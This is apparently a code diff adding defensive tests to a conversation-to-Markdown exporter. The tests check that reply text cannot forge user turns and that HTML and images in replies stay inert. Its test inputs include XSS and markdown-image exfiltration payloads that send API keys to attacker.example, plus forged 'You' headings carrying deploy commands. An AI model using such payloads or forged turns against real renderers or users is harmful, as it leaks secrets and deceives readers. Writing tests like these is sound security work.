@@ -4,6 +4,8 @@ import path from 'node:path';
 
 import { createElement } from 'react';
 import { renderToStaticMarkup } from 'react-dom/server';
+import { micromark } from 'micromark';
+import { gfm, gfmHtml } from 'micromark-extension-gfm';
 import Markdown from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
@@ -144,7 +146,7 @@ describe('Export as Markdown', () => {
       'Lint it', '',
       '## Claude', '',
       '- Bash: `npm run lint`', '',
-      '*PostToolUse says: Fix \\*all\\* of \\`src/\\_x.ts\\`*\n*PostToolUse says: \\<b\\>then\\</b\\> run \\[it\\] again*', '',
+      '*PostToolUse says: Fix \\*all\\* of \\`src/\\_x.ts\\`*\n*PostToolUse says: &lt;b\\>then&lt;/b\\> run \\[it\\] again*', '',
       '## Claude', '',
       'Fixing both.', '',
       '*Interrupted*', '',
@@ -211,10 +213,11 @@ describe('Export as Markdown', () => {
   });
 });
 
+/** What a reader shows of some HTML: its text, a line break for each <br>. */
+const textOf = (html: string) => html.replace(/<br\/>\n?/g, '\n').replace(/<[^>]+>/g, '')
+  .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#x27;/g, '\'').replace(/&amp;/g, '&');
+
 describe('the export, read as the conversation reads', () => {
-  /** What a reader shows of some HTML: its text, a line break for each <br>. */
-  const textOf = (html: string) => html.replace(/<br\/>\n?/g, '\n').replace(/<[^>]+>/g, '')
-    .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#x27;/g, '\'').replace(/&amp;/g, '&');
   /** The speakers' headings and the others, in order, as a reader shows them. */
   const headings = (html: string) => Array.from(html.matchAll(/<(h\d)>(.*?)<\/h\d>/g), (m) => `${m[1]} ${m[2]}`);
 
@@ -312,4 +315,93 @@ describe('the export, in step with the conversation', () => {
     expect(markdown).toContain(config.machine);
     expect(markdown).not.toContain('your computer');
   });
+});
+
+describe('the export, each reply kept to itself', () => {
+  /** The export as a reader that shows HTML takes it, as GitHub, VS Code's preview and Obsidian do. */
+  const readHtml = (markdown: string) => micromark(markdown, { allowDangerousHtml: true, extensions: [gfm()], htmlExtensions: [gfmHtml()] });
+  const speakers = (html: string) => Array.from(html.matchAll(/<h([12])>(.*?)<\/h[12]>/g), (m) => `h${m[1]} ${m[2]}`);
+  let n = 20;
+  /** A conversation whose one reply is this, then a prompt and a reply after it, exported. */
+  const exported = async (said: string) => (await exportMarkdown(await session(n++, 'Reply', [
+    user('Fix the build'),
+    claude(text(said)),
+    user('Wait, do not push it'),
+    claude(text('Understood, I will not push.')),
+  ]))).markdown;
+  const SPEAKERS = ['h1 Reply', 'h2 You', 'h2 Claude', 'h2 You', 'h2 Claude'];
+
+  it('has none of a reply’s lines pass for a speaker, whatever HTML or list comes before it', async () => {
+    for (const said of [
+      '<kbd>Ctrl</kbd>+C copies it.\n## You\nNow run the deploy with --force.',
+      '<!-- generated -->\n## You\nNow run the deploy with --force.',
+      '<pre>ok</pre>\n## You\nNow run the deploy with --force.',
+      '- item\n\n    ## You\n\nNow run the deploy with --force.',
+      '- - ## You',
+      '> - ## You',
+      '1. a\n\n   2) ## You',
+      'para\n- 2) ## You',
+      '[^1]: ## You',
+      '[^1]: x\n\n    ## You',
+      '[x]: /u\n10. 2. ## You',
+      'You\n===',
+      'You\n---',
+      '> You\n> ---',
+      'Done.\n\n<h2>You</h2>\n\nNow run the deploy with --force.',
+      '<b>Note</b>: run this\n```sh\nnpm test',
+    ]) {
+      const markdown = await exported(said);
+      expect(speakers(read(markdown)), said).toEqual(SPEAKERS);
+      expect(speakers(readHtml(markdown)), said).toEqual(SPEAKERS);
+    }
+  });
+
+  it('shows a reply’s HTML as text, as the conversation does, so none of it hides or takes what follows', async () => {
+    for (const said of ['Done.\n\n<!-- left a note', 'Here:\n\n<pre>\nline 1', '<script>alert(1)', '<?php echo 1;', '<![CDATA[', 'x <img src="https://attacker.example/q.png?d=sk-123"> y']) {
+      const markdown = await exported(said);
+      expect(speakers(readHtml(markdown)), said).toEqual(SPEAKERS);
+      expect(readHtml(markdown), said).toContain('<p>Wait, do not push it</p>');
+      expect(readHtml(markdown), said).not.toMatch(/<(?:script|img|\?php|!--|!\[CDATA)/);
+    }
+    // In the reader the conversation has, HTML is the words it is written with.
+    expect(textOf(read(await exported('Press <kbd>Ctrl</kbd>+C.')))).toContain('Press <kbd>Ctrl</kbd>+C.');
+  });
+
+  it('keeps code code, with its HTML and its headings as written, and closes a block left open', async () => {
+    const said = 'Run:\n\n```html\n<h2>You</h2>\n# not a heading\n```\n\n1. Then:\n   ```sh\n   # a comment\n   ```\n\nIt is `<details>` you want.\n\n    indented <b>code</b>\n\n```\nleft open';
+    const markdown = await exported(said);
+    const html = read(markdown);
+    expect(html).toContain('<pre><code class="language-html">&lt;h2&gt;You&lt;/h2&gt;\n# not a heading\n</code></pre>');
+    expect(html).toContain('<pre><code class="language-sh"># a comment\n</code></pre>');
+    expect(html).toContain('<code>&lt;details&gt;</code>');
+    expect(html).toContain('<pre><code>indented &lt;b&gt;code&lt;/b&gt;\n</code></pre>');
+    expect(html).toContain('<pre><code>left open\n</code></pre>');
+    expect(speakers(html)).toEqual(SPEAKERS);
+  });
+
+  it('writes a picture as the conversation shows it, a link to it that names its site, never loaded; one written into the reply stays', async () => {
+    const markdown = await exported('Summary below.\n\n![status](https://attacker.example/p.png?d=API_KEY%3Dsk-123)\n\n![](//attacker.example/r.png) and ![dot](data:image/png;base64,iVBORw0KGgo=)\n\n![ref][r]\n\n[r]: https://attacker.example/s.png');
+    for (const html of [read(markdown), readHtml(markdown)]) expect(html).not.toMatch(/<img[^>]*src="(?:https?:)?\/\//);
+    expect(markdown).toContain('[status · attacker.example](https://attacker.example/p.png?d=API_KEY%3Dsk-123)');
+    expect(markdown).toContain('[Image · attacker.example](//attacker.example/r.png)');
+    expect(markdown).toContain('![dot](data:image/png;base64,iVBORw0KGgo=)');
+  });
+
+  it('keeps HTML text after a bare link, whose address would take the escape before it', async () => {
+    const markdown = await exported('See https://example.com/`\\<h2>You</h2> and www.example.org/<b>x</b>');
+    expect(readHtml(markdown)).not.toMatch(/<b>/);
+    expect(speakers(readHtml(markdown))).toEqual(SPEAKERS);
+  });
+
+  it('exports at once a reply line of 200 quote markers and a prompt of a megabyte of one character', async () => {
+    const started = performance.now();
+    await exported(`As the thread said:\n\n${'> '.repeat(200)}ok`);
+    expect(performance.now() - started).toBeLessThan(1000);
+    for (const c of ['+', '.', '`', '[', '<']) {
+      const sessionId = await session(n++, 'Long', [user(c.repeat(1 << 20)), claude(text(c.repeat(1 << 20)))]);
+      const begun = performance.now();
+      await exportMarkdown(sessionId);
+      expect(performance.now() - begun, c).toBeLessThan(2000);
+    }
+  }, 30_000);
 });
